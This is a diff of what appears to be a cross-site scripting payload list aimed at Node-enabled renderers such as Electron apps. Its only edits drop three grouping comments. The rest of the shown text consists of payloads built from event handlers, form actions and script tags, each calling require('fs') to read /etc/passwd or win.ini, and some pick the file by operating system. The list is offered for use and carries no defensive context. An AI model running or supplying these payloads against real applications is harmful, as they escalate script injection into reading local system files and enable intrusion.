@@ -42,7 +42,6 @@
 
 <img src=x onerror="document.body.innerHTML=require('fs').readFileSync('/etc/passwd').toString();">
 
-<!-- 1-10 /etc/passwd -->
 <details open ontoggle="prompt(1,require('fs').readFileSync('/etc/passwd','utf8').split('\n')[0])">
 <details open ontoggle="prompt(1,require('fs').readFileSync('/etc/passwd').toString().match(/^root:[x:0]:0:/))">
 <form><button formaction="javascript:prompt(1,require('fs').readFileSync('/etc/passwd').toString().slice(0,120))">root</button></form>
@@ -54,7 +53,7 @@
 <keygen autofocus challenge="prompt(1,require('fs').readFileSync('/etc/passwd').toString().split('\n').length+'users')">
 <meter value=9 onclick="prompt(1,require('fs').readFileSync('/etc/passwd').toString().split('\n')[1])">9</meter>
 
-<!-- 11-20 win.ini -->
+
 <details open ontoggle="prompt(1,require('fs').readFileSync('C:/Windows/win.ini','utf8').split('\n')[0])">
 <details open ontoggle="prompt(1,require('fs').readFileSync('C:\\Windows\\win.ini').toString().match(/fonts/))">
 <form><button formaction="javascript:prompt(1,require('fs').readFileSync('C:/Windows/win.ini').toString().slice(0,100))">win.ini</button></form>
@@ -66,7 +65,7 @@
 <marquee onstart="prompt(1,require('fs').readFileSync('C:/Windows/win.ini').toString().split('\r\n')[0])">
 <xmp><script>prompt(1,require('fs').readFileSync('C:/Windows/win.ini').toString().split('\n')[3])</script></xmp>
 
-<!-- 21-30 Auto-detect Linux vs Windows -->
+
 <details open ontoggle="prompt(1,require('fs').readFileSync(require('os').platform()==='win32'?'C:/Windows/win.ini':'/etc/passwd').toString().slice(0,90))">
 <details open ontoggle="prompt(1,require('fs').readFileSync(process.platform==='linux'?'/etc/passwd':'C:/Windows/win.ini').toString().split('\n')[0])">
 <form><button formaction="javascript:prompt(1,require('fs').readFileSync(process.env.HOME?'/etc/passwd':'C:/Windows/win.ini').toString().slice(0,80))">auto</button></form>
